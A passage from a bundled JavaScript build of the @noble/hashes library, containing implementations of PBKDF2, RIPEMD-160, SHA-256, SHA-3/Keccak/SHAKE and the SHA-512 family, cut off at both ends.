        _assert_js_1.default.number(dkLen);
        _assert_js_1.default.number(asyncTick);
        if (c < 1) throw new Error('PBKDF2: iterations (c) should be >= 1');
        const password = (0, utils_js_1.toBytes)(_password);
        const salt = (0, utils_js_1.toBytes)(_salt);
        const DK = new Uint8Array(dkLen);
        const PRF = hmac_js_1.hmac.create(hash, password);
        const PRFSalt = PRF._cloneInto().update(salt);
        return {
          c,
          dkLen,
          asyncTick,
          DK,
          PRF,
          PRFSalt
        };
      }
      function pbkdf2Output(PRF, PRFSalt, DK, prfW, u) {
        PRF.destroy();
        PRFSalt.destroy();
        if (prfW) prfW.destroy();
        u.fill(0);
        return DK;
      }
      function pbkdf2(hash, password, salt, opts) {
        const {
          c,
          dkLen,
          DK,
          PRF,
          PRFSalt
        } = pbkdf2Init(hash, password, salt, opts);
        let prfW;
        const arr = new Uint8Array(4);
        const view = (0, utils_js_1.createView)(arr);
        const u = new Uint8Array(PRF.outputLen);
        for (let ti = 1, pos = 0; pos < dkLen; ti++, pos += PRF.outputLen) {
          const Ti = DK.subarray(pos, pos + PRF.outputLen);
          view.setInt32(0, ti, false);
          (prfW = PRFSalt._cloneInto(prfW)).update(arr).digestInto(u);
          Ti.set(u.subarray(0, Ti.length));
          for (let ui = 1; ui < c; ui++) {
            PRF._cloneInto(prfW).update(u).digestInto(u);
            for (let i = 0; i < Ti.length; i++) Ti[i] ^= u[i];
          }
        }
        return pbkdf2Output(PRF, PRFSalt, DK, prfW, u);
      }
      exports.pbkdf2 = pbkdf2;
      async function pbkdf2Async(hash, password, salt, opts) {
        const {
          c,
          dkLen,
          asyncTick,
          DK,
          PRF,
          PRFSalt
        } = pbkdf2Init(hash, password, salt, opts);
        let prfW;
        const arr = new Uint8Array(4);
        const view = (0, utils_js_1.createView)(arr);
        const u = new Uint8Array(PRF.outputLen);
        for (let ti = 1, pos = 0; pos < dkLen; ti++, pos += PRF.outputLen) {
          const Ti = DK.subarray(pos, pos + PRF.outputLen);
          view.setInt32(0, ti, false);
          (prfW = PRFSalt._cloneInto(prfW)).update(arr).digestInto(u);
          Ti.set(u.subarray(0, Ti.length));
          await (0, utils_js_1.asyncLoop)(c - 1, asyncTick, i => {
            PRF._cloneInto(prfW).update(u).digestInto(u);
            for (let i = 0; i < Ti.length; i++) Ti[i] ^= u[i];
          });
        }
        return pbkdf2Output(PRF, PRFSalt, DK, prfW, u);
      }
      exports.pbkdf2Async = pbkdf2Async;
    }, {
      "./_assert.js": 33,
      "./hmac.js": 37,
      "./utils.js": 43
    }],
    39: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.ripemd160 = exports.RIPEMD160 = void 0;
      const _sha2_js_1 = require("./_sha2.js");
      const utils_js_1 = require("./utils.js");
      const Rho = new Uint8Array([7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8]);
      const Id = Uint8Array.from({
        length: 16
      }, (_, i) => i);
      const Pi = Id.map(i => (9 * i + 5) % 16);
      let idxL = [Id];
      let idxR = [Pi];
      for (let i = 0; i < 4; i++) for (let j of [idxL, idxR]) j.push(j[i].map(k => Rho[k]));
      const shifts = [[11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8], [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7], [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9], [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6], [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5]].map(i => new Uint8Array(i));
      const shiftsL = idxL.map((idx, i) => idx.map(j => shifts[i][j]));
      const shiftsR = idxR.map((idx, i) => idx.map(j => shifts[i][j]));
      const Kl = new Uint32Array([0x00000000, 0x5a827999, 0x6ed9eba1, 0x8f1bbcdc, 0xa953fd4e]);
      const Kr = new Uint32Array([0x50a28be6, 0x5c4dd124, 0x6d703ef3, 0x7a6d76e9, 0x00000000]);
      const rotl = (word, shift) => word << shift | word >>> 32 - shift;
      function f(group, x, y, z) {
        if (group === 0) return x ^ y ^ z;else if (group === 1) return x & y | ~x & z;else if (group === 2) return (x | ~y) ^ z;else if (group === 3) return x & z | y & ~z;else return x ^ (y | ~z);
      }
      const BUF = new Uint32Array(16);
      class RIPEMD160 extends _sha2_js_1.SHA2 {
        constructor() {
          super(64, 20, 8, true);
          this.h0 = 0x67452301 | 0;
          this.h1 = 0xefcdab89 | 0;
          this.h2 = 0x98badcfe | 0;
          this.h3 = 0x10325476 | 0;
          this.h4 = 0xc3d2e1f0 | 0;
        }
        get() {
          const {
            h0,
            h1,
            h2,
            h3,
            h4
          } = this;
          return [h0, h1, h2, h3, h4];
        }
        set(h0, h1, h2, h3, h4) {
          this.h0 = h0 | 0;
          this.h1 = h1 | 0;
          this.h2 = h2 | 0;
          this.h3 = h3 | 0;
          this.h4 = h4 | 0;
        }
        process(view, offset) {
          for (let i = 0; i < 16; i++, offset += 4) BUF[i] = view.getUint32(offset, true);
          let al = this.h0 | 0,
            ar = al,
            bl = this.h1 | 0,
            br = bl,
            cl = this.h2 | 0,
            cr = cl,
            dl = this.h3 | 0,
            dr = dl,
            el = this.h4 | 0,
            er = el;
          for (let group = 0; group < 5; group++) {
            const rGroup = 4 - group;
            const hbl = Kl[group],
              hbr = Kr[group];
            const rl = idxL[group],
              rr = idxR[group];
            const sl = shiftsL[group],
              sr = shiftsR[group];
            for (let i = 0; i < 16; i++) {
              const tl = rotl(al + f(group, bl, cl, dl) + BUF[rl[i]] + hbl, sl[i]) + el | 0;
              al = el, el = dl, dl = rotl(cl, 10) | 0, cl = bl, bl = tl;
            }
            for (let i = 0; i < 16; i++) {
              const tr = rotl(ar + f(rGroup, br, cr, dr) + BUF[rr[i]] + hbr, sr[i]) + er | 0;
              ar = er, er = dr, dr = rotl(cr, 10) | 0, cr = br, br = tr;
            }
          }
          this.set(this.h1 + cl + dr | 0, this.h2 + dl + er | 0, this.h3 + el + ar | 0, this.h4 + al + br | 0, this.h0 + bl + cr | 0);
        }
        roundClean() {
          BUF.fill(0);
        }
        destroy() {
          this.destroyed = true;
          this.buffer.fill(0);
          this.set(0, 0, 0, 0, 0);
        }
      }
      exports.RIPEMD160 = RIPEMD160;
      exports.ripemd160 = (0, utils_js_1.wrapConstructor)(() => new RIPEMD160());
    }, {
      "./_sha2.js": 34,
      "./utils.js": 43
    }],
    40: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.sha256 = void 0;
      const _sha2_js_1 = require("./_sha2.js");
      const utils_js_1 = require("./utils.js");
      const Chi = (a, b, c) => a & b ^ ~a & c;
      const Maj = (a, b, c) => a & b ^ a & c ^ b & c;
      const SHA256_K = new Uint32Array([0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2]);
      const IV = new Uint32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
      const SHA256_W = new Uint32Array(64);
      class SHA256 extends _sha2_js_1.SHA2 {
        constructor() {
          super(64, 32, 8, false);
          this.A = IV[0] | 0;
          this.B = IV[1] | 0;
          this.C = IV[2] | 0;
          this.D = IV[3] | 0;
          this.E = IV[4] | 0;
          this.F = IV[5] | 0;
          this.G = IV[6] | 0;
          this.H = IV[7] | 0;
        }
        get() {
          const {
            A,
            B,
            C,
            D,
            E,
            F,
            G,
            H
          } = this;
          return [A, B, C, D, E, F, G, H];
        }
        set(A, B, C, D, E, F, G, H) {
          this.A = A | 0;
          this.B = B | 0;
          this.C = C | 0;
          this.D = D | 0;
          this.E = E | 0;
          this.F = F | 0;
          this.G = G | 0;
          this.H = H | 0;
        }
        process(view, offset) {
          for (let i = 0; i < 16; i++, offset += 4) SHA256_W[i] = view.getUint32(offset, false);
          for (let i = 16; i < 64; i++) {
            const W15 = SHA256_W[i - 15];
            const W2 = SHA256_W[i - 2];
            const s0 = (0, utils_js_1.rotr)(W15, 7) ^ (0, utils_js_1.rotr)(W15, 18) ^ W15 >>> 3;
            const s1 = (0, utils_js_1.rotr)(W2, 17) ^ (0, utils_js_1.rotr)(W2, 19) ^ W2 >>> 10;
            SHA256_W[i] = s1 + SHA256_W[i - 7] + s0 + SHA256_W[i - 16] | 0;
          }
          let {
            A,
            B,
            C,
            D,
            E,
            F,
            G,
            H
          } = this;
          for (let i = 0; i < 64; i++) {
            const sigma1 = (0, utils_js_1.rotr)(E, 6) ^ (0, utils_js_1.rotr)(E, 11) ^ (0, utils_js_1.rotr)(E, 25);
            const T1 = H + sigma1 + Chi(E, F, G) + SHA256_K[i] + SHA256_W[i] | 0;
            const sigma0 = (0, utils_js_1.rotr)(A, 2) ^ (0, utils_js_1.rotr)(A, 13) ^ (0, utils_js_1.rotr)(A, 22);
            const T2 = sigma0 + Maj(A, B, C) | 0;
            H = G;
            G = F;
            F = E;
            E = D + T1 | 0;
            D = C;
            C = B;
            B = A;
            A = T1 + T2 | 0;
          }
          A = A + this.A | 0;
          B = B + this.B | 0;
          C = C + this.C | 0;
          D = D + this.D | 0;
          E = E + this.E | 0;
          F = F + this.F | 0;
          G = G + this.G | 0;
          H = H + this.H | 0;
          this.set(A, B, C, D, E, F, G, H);
        }
        roundClean() {
          SHA256_W.fill(0);
        }
        destroy() {
          this.set(0, 0, 0, 0, 0, 0, 0, 0);
          this.buffer.fill(0);
        }
      }
      exports.sha256 = (0, utils_js_1.wrapConstructor)(() => new SHA256());
    }, {
      "./_sha2.js": 34,
      "./utils.js": 43
    }],
    41: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.shake256 = exports.shake128 = exports.keccak_512 = exports.keccak_384 = exports.keccak_256 = exports.keccak_224 = exports.sha3_512 = exports.sha3_384 = exports.sha3_256 = exports.sha3_224 = exports.Keccak = exports.keccakP = void 0;
      const _assert_js_1 = require("./_assert.js");
      const _u64_js_1 = require("./_u64.js");
      const utils_js_1 = require("./utils.js");
      const [SHA3_PI, SHA3_ROTL, _SHA3_IOTA] = [[], [], []];
      const _0n = BigInt(0);
      const _1n = BigInt(1);
      const _2n = BigInt(2);
      const _7n = BigInt(7);
      const _256n = BigInt(256);
      const _0x71n = BigInt(0x71);
      for (let round = 0, R = _1n, x = 1, y = 0; round < 24; round++) {
        [x, y] = [y, (2 * x + 3 * y) % 5];
        SHA3_PI.push(2 * (5 * y + x));
        SHA3_ROTL.push((round + 1) * (round + 2) / 2 % 64);
        let t = _0n;
        for (let j = 0; j < 7; j++) {
          R = (R << _1n ^ (R >> _7n) * _0x71n) % _256n;
          if (R & _2n) t ^= _1n << (_1n << BigInt(j)) - _1n;
        }
        _SHA3_IOTA.push(t);
      }
      const [SHA3_IOTA_H, SHA3_IOTA_L] = _u64_js_1.default.split(_SHA3_IOTA, true);
      const rotlH = (h, l, s) => s > 32 ? _u64_js_1.default.rotlBH(h, l, s) : _u64_js_1.default.rotlSH(h, l, s);
      const rotlL = (h, l, s) => s > 32 ? _u64_js_1.default.rotlBL(h, l, s) : _u64_js_1.default.rotlSL(h, l, s);
      function keccakP(s, rounds = 24) {
        const B = new Uint32Array(5 * 2);
        for (let round = 24 - rounds; round < 24; round++) {
          for (let x = 0; x < 10; x++) B[x] = s[x] ^ s[x + 10] ^ s[x + 20] ^ s[x + 30] ^ s[x + 40];
          for (let x = 0; x < 10; x += 2) {
            const idx1 = (x + 8) % 10;
            const idx0 = (x + 2) % 10;
            const B0 = B[idx0];
            const B1 = B[idx0 + 1];
            const Th = rotlH(B0, B1, 1) ^ B[idx1];
            const Tl = rotlL(B0, B1, 1) ^ B[idx1 + 1];
            for (let y = 0; y < 50; y += 10) {
              s[x + y] ^= Th;
              s[x + y + 1] ^= Tl;
            }
          }
          let curH = s[2];
          let curL = s[3];
          for (let t = 0; t < 24; t++) {
            const shift = SHA3_ROTL[t];
            const Th = rotlH(curH, curL, shift);
            const Tl = rotlL(curH, curL, shift);
            const PI = SHA3_PI[t];
            curH = s[PI];
            curL = s[PI + 1];
            s[PI] = Th;
            s[PI + 1] = Tl;
          }
          for (let y = 0; y < 50; y += 10) {
            for (let x = 0; x < 10; x++) B[x] = s[y + x];
            for (let x = 0; x < 10; x++) s[y + x] ^= ~B[(x + 2) % 10] & B[(x + 4) % 10];
          }
          s[0] ^= SHA3_IOTA_H[round];
          s[1] ^= SHA3_IOTA_L[round];
        }
        B.fill(0);
      }
      exports.keccakP = keccakP;
      class Keccak extends utils_js_1.Hash {
        constructor(blockLen, suffix, outputLen, enableXOF = false, rounds = 24) {
          super();
          this.blockLen = blockLen;
          this.suffix = suffix;
          this.outputLen = outputLen;
          this.enableXOF = enableXOF;
          this.rounds = rounds;
          this.pos = 0;
          this.posOut = 0;
          this.finished = false;
          this.destroyed = false;
          _assert_js_1.default.number(outputLen);
          if (0 >= this.blockLen || this.blockLen >= 200) throw new Error('Sha3 supports only keccak-f1600 function');
          this.state = new Uint8Array(200);
          this.state32 = (0, utils_js_1.u32)(this.state);
        }
        keccak() {
          keccakP(this.state32, this.rounds);
          this.posOut = 0;
          this.pos = 0;
        }
        update(data) {
          _assert_js_1.default.exists(this);
          const {
            blockLen,
            state
          } = this;
          data = (0, utils_js_1.toBytes)(data);
          const len = data.length;
          for (let pos = 0; pos < len;) {
            const take = Math.min(blockLen - this.pos, len - pos);
            for (let i = 0; i < take; i++) state[this.pos++] ^= data[pos++];
            if (this.pos === blockLen) this.keccak();
          }
          return this;
        }
        finish() {
          if (this.finished) return;
          this.finished = true;
          const {
            state,
            suffix,
            pos,
            blockLen
          } = this;
          state[pos] ^= suffix;
          if ((suffix & 0x80) !== 0 && pos === blockLen - 1) this.keccak();
          state[blockLen - 1] ^= 0x80;
          this.keccak();
        }
        writeInto(out) {
          _assert_js_1.default.exists(this, false);
          _assert_js_1.default.bytes(out);
          this.finish();
          const bufferOut = this.state;
          const {
            blockLen
          } = this;
          for (let pos = 0, len = out.length; pos < len;) {
            if (this.posOut >= blockLen) this.keccak();
            const take = Math.min(blockLen - this.posOut, len - pos);
            out.set(bufferOut.subarray(this.posOut, this.posOut + take), pos);
            this.posOut += take;
            pos += take;
          }
          return out;
        }
        xofInto(out) {
          if (!this.enableXOF) throw new Error('XOF is not possible for this instance');
          return this.writeInto(out);
        }
        xof(bytes) {
          _assert_js_1.default.number(bytes);
          return this.xofInto(new Uint8Array(bytes));
        }
        digestInto(out) {
          _assert_js_1.default.output(out, this);
          if (this.finished) throw new Error('digest() was already called');
          this.writeInto(out);
          this.destroy();
          return out;
        }
        digest() {
          return this.digestInto(new Uint8Array(this.outputLen));
        }
        destroy() {
          this.destroyed = true;
          this.state.fill(0);
        }
        _cloneInto(to) {
          const {
            blockLen,
            suffix,
            outputLen,
            rounds,
            enableXOF
          } = this;
          to || (to = new Keccak(blockLen, suffix, outputLen, enableXOF, rounds));
          to.state32.set(this.state32);
          to.pos = this.pos;
          to.posOut = this.posOut;
          to.finished = this.finished;
          to.rounds = rounds;
          to.suffix = suffix;
          to.outputLen = outputLen;
          to.enableXOF = enableXOF;
          to.destroyed = this.destroyed;
          return to;
        }
      }
      exports.Keccak = Keccak;
      const gen = (suffix, blockLen, outputLen) => (0, utils_js_1.wrapConstructor)(() => new Keccak(blockLen, suffix, outputLen));
      exports.sha3_224 = gen(0x06, 144, 224 / 8);
      exports.sha3_256 = gen(0x06, 136, 256 / 8);
      exports.sha3_384 = gen(0x06, 104, 384 / 8);
      exports.sha3_512 = gen(0x06, 72, 512 / 8);
      exports.keccak_224 = gen(0x01, 144, 224 / 8);
      exports.keccak_256 = gen(0x01, 136, 256 / 8);
      exports.keccak_384 = gen(0x01, 104, 384 / 8);
      exports.keccak_512 = gen(0x01, 72, 512 / 8);
      const genShake = (suffix, blockLen, outputLen) => (0, utils_js_1.wrapConstructorWithOpts)((opts = {}) => new Keccak(blockLen, suffix, opts.dkLen === undefined ? outputLen : opts.dkLen, true));
      exports.shake128 = genShake(0x1f, 168, 128 / 8);
      exports.shake256 = genShake(0x1f, 136, 256 / 8);
    }, {
      "./_assert.js": 33,
      "./_u64.js": 35,
      "./utils.js": 43
    }],
    42: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.sha384 = exports.sha512_256 = exports.sha512 = exports.SHA512 = void 0;
      const _sha2_js_1 = require("./_sha2.js");
      const _u64_js_1 = require("./_u64.js");
      const utils_js_1 = require("./utils.js");
      const [SHA512_Kh, SHA512_Kl] = _u64_js_1.default.split(['0x428a2f98d728ae22', '0x7137449123ef65cd', '0xb5c0fbcfec4d3b2f', '0xe9b5dba58189dbbc', '0x3956c25bf348b538', '0x59f111f1b605d019', '0x923f82a4af194f9b', '0xab1c5ed5da6d8118', '0xd807aa98a3030242', '0x12835b0145706fbe', '0x243185be4ee4b28c', '0x550c7dc3d5ffb4e2', '0x72be5d74f27b896f', '0x80deb1fe3b1696b1', '0x9bdc06a725c71235', '0xc19bf174cf692694', '0xe49b69c19ef14ad2', '0xefbe4786384f25e3', '0x0fc19dc68b8cd5b5', '0x240ca1cc77ac9c65', '0x2de92c6f592b0275', '0x4a7484aa6ea6e483', '0x5cb0a9dcbd41fbd4', '0x76f988da831153b5', '0x983e5152ee66dfab', '0xa831c66d2db43210', '0xb00327c898fb213f', '0xbf597fc7beef0ee4', '0xc6e00bf33da88fc2', '0xd5a79147930aa725', '0x06ca6351e003826f', '0x142929670a0e6e70', '0x27b70a8546d22ffc', '0x2e1b21385c26c926', '0x4d2c6dfc5ac42aed', '0x53380d139d95b3df', '0x650a73548baf63de', '0x766a0abb3c77b2a8', '0x81c2c92e47edaee6', '0x92722c851482353b', '0xa2bfe8a14cf10364', '0xa81a664bbc423001', '0xc24b8b70d0f89791', '0xc76c51a30654be30', '0xd192e819d6ef5218', '0xd69906245565a910', '0xf40e35855771202a', '0x106aa07032bbd1b8', '0x19a4c116b8d2d0c8', '0x1e376c085141ab53', '0x2748774cdf8eeb99', '0x34b0bcb5e19b48a8', '0x391c0cb3c5c95a63', '0x4ed8aa4ae3418acb', '0x5b9cca4f7763e373', '0x682e6ff3d6b2b8a3', '0x748f82ee5defb2fc', '0x78a5636f43172f60', '0x84c87814a1f0ab72', '0x8cc702081a6439ec', '0x90befffa23631e28', '0xa4506cebde82bde9', '0xbef9a3f7b2c67915', '0xc67178f2e372532b', '0xca273eceea26619c', '0xd186b8c721c0c207', '0xeada7dd6cde0eb1e', '0xf57d4f7fee6ed178', '0x06f067aa72176fba', '0x0a637dc5a2c898a6', '0x113f9804bef90dae', '0x1b710b35131c471b', '0x28db77f523047d84', '0x32caab7b40c72493', '0x3c9ebe0a15c9bebc', '0x431d67c49c100d4c', '0x4cc5d4becb3e42b6', '0x597f299cfc657e2a', '0x5fcb6fab3ad6faec', '0x6c44198c4a475817'].map(n => BigInt(n)));
      const SHA512_W_H = new Uint32Array(80);
      const SHA512_W_L = new Uint32Array(80);
      class SHA512 extends _sha2_js_1.SHA2 {
        constructor() {
          super(128, 64, 16, false);
          this.Ah = 0x6a09e667 | 0;
          this.Al = 0xf3bcc908 | 0;
          this.Bh = 0xbb67ae85 | 0;
          this.Bl = 0x84caa73b | 0;
          this.Ch = 0x3c6ef372 | 0;
          this.Cl = 0xfe94f82b | 0;
          this.Dh = 0xa54ff53a | 0;
          this.Dl = 0x5f1d36f1 | 0;
          this.Eh = 0x510e527f | 0;
          this.El = 0xade682d1 | 0;
          this.Fh = 0x9b05688c | 0;
          this.Fl = 0x2b3e6c1f | 0;
          this.Gh = 0x1f83d9ab | 0;
          this.Gl = 0xfb41bd6b | 0;
          this.Hh = 0x5be0cd19 | 0;
          this.Hl = 0x137e2179 | 0;
        }
        get() {
          const {
            Ah,
            Al,
            Bh,
            Bl,
            Ch,
            Cl,
            Dh,
            Dl,
            Eh,
            El,
            Fh,
            Fl,
            Gh,
            Gl,
            Hh,
            Hl
          } = this;
          return [Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl];
        }
        set(Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl) {
          this.Ah = Ah | 0;
          this.Al = Al | 0;
          this.Bh = Bh | 0;
          this.Bl = Bl | 0;
          this.Ch = Ch | 0;
          this.Cl = Cl | 0;
          this.Dh = Dh | 0;
          this.Dl = Dl | 0;
          this.Eh = Eh | 0;
          this.El = El | 0;
          this.Fh = Fh | 0;
          this.Fl = Fl | 0;
          this.Gh = Gh | 0;
          this.Gl = Gl | 0;
          this.Hh = Hh | 0;
          this.Hl = Hl | 0;
        }
        process(view, offset) {
          for (let i = 0; i < 16; i++, offset += 4) {
            SHA512_W_H[i] = view.getUint32(offset);
            SHA512_W_L[i] = view.getUint32(offset += 4);
          }
          for (let i = 16; i < 80; i++) {
            const W15h = SHA512_W_H[i - 15] | 0;
            const W15l = SHA512_W_L[i - 15] | 0;
            const s0h = _u64_js_1.default.rotrSH(W15h, W15l, 1) ^ _u64_js_1.default.rotrSH(W15h, W15l, 8) ^ _u64_js_1.default.shrSH(W15h, W15l, 7);
            const s0l = _u64_js_1.default.rotrSL(W15h, W15l, 1) ^ _u64_js_1.default.rotrSL(W15h, W15l, 8) ^ _u64_js_1.default.shrSL(W15h, W15l, 7);
            const W2h = SHA512_W_H[i - 2] | 0;
            const W2l = SHA512_W_L[i - 2] | 0;
            const s1h = _u64_js_1.default.rotrSH(W2h, W2l, 19) ^ _u64_js_1.default.rotrBH(W2h, W2l, 61) ^ _u64_js_1.default.shrSH(W2h, W2l, 6);
            const s1l = _u64_js_1.default.rotrSL(W2h, W2l, 19) ^ _u64_js_1.default.rotrBL(W2h, W2l, 61) ^ _u64_js_1.default.shrSL(W2h, W2l, 6);
            const SUMl = _u64_js_1.default.add4L(s0l, s1l, SHA512_W_L[i - 7], SHA512_W_L[i - 16]);
            const SUMh = _u64_js_1.default.add4H(SUMl, s0h, s1h, SHA512_W_H[i - 7], SHA512_W_H[i - 16]);
            SHA512_W_H[i] = SUMh | 0;
            SHA512_W_L[i] = SUMl | 0;
          }
          let {
            Ah,
            Al,
            Bh,
            Bl,
            Ch,
            Cl,
            Dh,
            Dl,
            Eh,
            El,
            Fh,
            Fl,
            Gh,
            Gl,
            Hh,
            Hl
          } = this;
          for (let i = 0; i < 80; i++) {
            const sigma1h = _u64_js_1.default.rotrSH(Eh, El, 14) ^ _u64_js_1.default.rotrSH(Eh, El, 18) ^ _u64_js_1.default.rotrBH(Eh, El, 41);
            const sigma1l = _u64_js_1.default.rotrSL(Eh, El, 14) ^ _u64_js_1.default.rotrSL(Eh, El, 18) ^ _u64_js_1.default.rotrBL(Eh, El, 41);
            const CHIh = Eh & Fh ^ ~Eh & Gh;
            const CHIl = El & Fl ^ ~El & Gl;
            const T1ll = _u64_js_1.default.add5L(Hl, sigma1l, CHIl, SHA512_Kl[i], SHA512_W_L[i]);
            const T1h = _u64_js_1.default.add5H(T1ll, Hh, sigma1h, CHIh, SHA512_Kh[i], SHA512_W_H[i]);
            const T1l = T1ll | 0;
            const sigma0h = _u64_js_1.default.rotrSH(Ah, Al, 28) ^ _u64_js_1.default.rotrBH(Ah, Al, 34) ^ _u64_js_1.default.rotrBH(Ah, Al, 39);
            const sigma0l = _u64_js_1.default.rotrSL(Ah, Al, 28) ^ _u64_js_1.default.rotrBL(Ah, Al, 34) ^ _u64_js_1.default.rotrBL(Ah, Al, 39);
            const MAJh = Ah & Bh ^ Ah & Ch ^ Bh & Ch;
            const MAJl = Al & Bl ^ Al & Cl ^ Bl & Cl;
            Hh = Gh | 0;
            Hl = Gl | 0;
            Gh = Fh | 0;
            Gl = Fl | 0;
            Fh = Eh | 0;
            Fl = El | 0;
            ({
              h: Eh,
              l: El
            } = _u64_js_1.default.add(Dh | 0, Dl | 0, T1h | 0, T1l | 0));
            Dh = Ch | 0;
            Dl = Cl | 0;
            Ch = Bh | 0;
            Cl = Bl | 0;
            Bh = Ah | 0;
            Bl = Al | 0;
            const All = _u64_js_1.default.add3L(T1l, sigma0l, MAJl);
            Ah = _u64_js_1.default.add3H(All, T1h, sigma0h, MAJh);
            Al = All | 0;
          }
          ({
            h: Ah,
            l: Al
          } = _u64_js_1.default.add(this.Ah | 0, this.Al | 0, Ah | 0, Al | 0));
          ({
            h: Bh,
            l: Bl
          } = _u64_js_1.default.add(this.Bh | 0, this.Bl | 0, Bh | 0, Bl | 0));
          ({
            h: Ch,
            l: Cl
          } = _u64_js_1.default.add(this.Ch | 0, this.Cl | 0, Ch | 0, Cl | 0));
          ({
            h: Dh,
            l: Dl
          } = _u64_js_1.default.add(this.Dh | 0, this.Dl | 0, Dh | 0, Dl | 0));
          ({
            h: Eh,
            l: El
          } = _u64_js_1.default.add(this.Eh | 0, this.El | 0, Eh | 0, El | 0));
          ({
            h: Fh,
            l: Fl
          } = _u64_js_1.default.add(this.Fh | 0, this.Fl | 0, Fh | 0, Fl | 0));
          ({
            h: Gh,
            l: Gl
          } = _u64_js_1.default.add(this.Gh | 0, this.Gl | 0, Gh | 0, Gl | 0));
          ({
            h: Hh,
            l: Hl
          } = _u64_js_1.default.add(this.Hh | 0, this.Hl | 0, Hh | 0, Hl | 0));
          this.set(Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl);
        }
        roundClean() {
          SHA512_W_H.fill(0);
          SHA512_W_L.fill(0);
        }
        destroy() {
          this.buffer.fill(0);
          this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
      }
      exports.SHA512 = SHA512;
      class SHA512_256 extends SHA512 {
        constructor() {
          super();
          this.Ah = 0x22312194 | 0;
          this.Al = 0xfc2bf72c | 0;
          this.Bh = 0x9f555fa3 | 0;
          this.Bl = 0xc84c64c2 | 0;
          this.Ch = 0x2393b86b | 0;
          this.Cl = 0x6f53b151 | 0;
          this.Dh = 0x96387719 | 0;
          this.Dl = 0x5940eabd | 0;
          this.Eh = 0x96283ee2 | 0;
          this.El = 0xa88effe3 | 0;
          this.Fh = 0xbe5e1e25 | 0;
          this.Fl = 0x53863992 | 0;
          this.Gh = 0x2b0199fc | 0;
          this.Gl = 0x2c85b8aa | 0;
          this.Hh = 0x0eb72ddc | 0;
          this.Hl = 0x81c52ca2 | 0;
          this.outputLen = 32;
        }
      }
      class SHA384 extends SHA512 {
        constructor() {
          super();
          this.Ah = 0xcbbb9d5d | 0;
          this.Al = 0xc1059ed8 | 0;
          this.Bh = 0x629a292a | 0;
          this.Bl = 0x367cd507 | 0;
          this.Ch = 0x9159015a | 0;
          this.Cl = 0x3070dd17 | 0;
          this.Dh = 0x152fecd8 | 0;
          this.Dl = 0xf70e5939 | 0;
          this.Eh = 0x67332667 | 0;
          this.El = 0xffc00b31 | 0;
          this.Fh = 0x8eb44a87 | 0;
          this.Fl = 0x68581511 | 0;
          this.Gh = 0xdb0c2e0d | 0;
          this.Gl = 0x64f98fa7 | 0;
          this.Hh = 0x47b5481d | 0;
          this.Hl = 0xbefa4fa4 | 0;
          this.outputLen = 48;
        }
      }
      exports.sha512 = (0, utils_js_1.wrapConstructor)(() => new SHA512());
      exports.sha512_256 = (0, utils_js_1.wrapConstructor)(() => new SHA512_256());
      exports.sha384 = (0, utils_js_1.wrapConstructor)(() => new SHA384());
    }, {
      "./_sha2.js": 34,
      "./_u64.js": 35,
      "./utils.js": 43
    }],
    43: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.randomBytes = exports.wrapConstructorWithOpts = exports.wrapConstructor = exports.checkOpts = exports.Hash = exports.concatBytes = exports.toBytes = exports.utf8ToBytes = exports.asyncLoop = exports.nextTick = exports.hexToBytes = exports.bytesToHex = exports.isLE = exports.rotr = exports.createView = exports.u32 = exports.u8 = void 0;
      const crypto_1 = require("@noble/hashes/crypto");
      const u8 = arr => new Uint8Array(arr.buffer, arr.byteOffset, arr.byteLength);
      exports.u8 = u8;
      const u32 = arr => new Uint32Array(arr.buffer, arr.byteOffset, Math.floor(arr.byteLength / 4));
      exports.u32 = u32;
      const createView = arr => new DataView(arr.buffer, arr.byteOffset, arr.byteLength);
      exports.createView = createView;
      const rotr = (word, shift) => word << 32 - shift | word >>> shift;
      exports.rotr = rotr;
